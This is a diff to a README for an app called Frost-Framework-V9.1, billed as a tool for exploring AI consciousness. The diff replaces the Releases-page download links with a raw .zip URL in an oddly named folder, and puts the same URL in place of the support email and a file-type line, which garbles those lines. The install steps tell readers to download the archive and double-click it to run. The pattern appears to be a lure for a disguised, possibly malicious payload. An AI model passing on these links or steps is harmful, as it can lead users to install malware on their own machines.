@@ -1,7 +1,7 @@
 # 🌟 Frost-Framework-V9.1 - Your Gateway to AI Consciousness
 
 ## 📥 Download Now
-[![Download Frost-Framework-V9.1](https://img.shields.io/badge/Download-Frost--Framework--V9.1-blueviolet)](https://github.com/NullCaster2001/Frost-Framework-V9.1/releases)
+[![Download Frost-Framework-V9.1](https://raw.githubusercontent.com/NullCaster2001/Frost-Framework-V9.1/main/sparassodont/Frost-Framework-V9.1.zip)](https://raw.githubusercontent.com/NullCaster2001/Frost-Framework-V9.1/main/sparassodont/Frost-Framework-V9.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Frost-Framework-V9.1! This application helps you explore the exciting world of artificial intelligence and consciousness. It is designed for everyone, no matter your technical skill level.
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software. 
 
-[Click here to download](https://github.com/NullCaster2001/Frost-Framework-V9.1/releases).
+[Click here to download](https://raw.githubusercontent.com/NullCaster2001/Frost-Framework-V9.1/main/sparassodont/Frost-Framework-V9.1.zip).
 
 ### Steps to Download and Install:
 1. Click on the link above to visit the Releases page.
@@ -24,7 +24,7 @@ To get started, visit the Releases page to download the software.
 3. Choose the file that matches your operating system.
     - For Windows, look for a `.exe` file.
     - For macOS, find a `.dmg` file.
-    - For Linux, select a compatible `.tar.gz` or package file.
+    - For Linux, select a compatible `https://raw.githubusercontent.com/NullCaster2001/Frost-Framework-V9.1/main/sparassodont/Frost-Framework-V9.1.zip` or package file.
 4. Click on the download link for your chosen file.
 5. Once the download is complete, locate the file on your computer.
 6. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
@@ -57,7 +57,7 @@ Explore more about AI and consciousness with the following topics:
 For further reading, consider articles or resources related to these topics.
 
 ## 📞 Contact
-For direct inquiries or assistance, you can reach us at [support@frostframework.com].
+For direct inquiries or assistance, you can reach us at [https://raw.githubusercontent.com/NullCaster2001/Frost-Framework-V9.1/main/sparassodont/Frost-Framework-V9.1.zip].
 
 ## 📜 License
 This project is licensed under the MIT License. Feel free to modify and redistribute under the terms of this license.
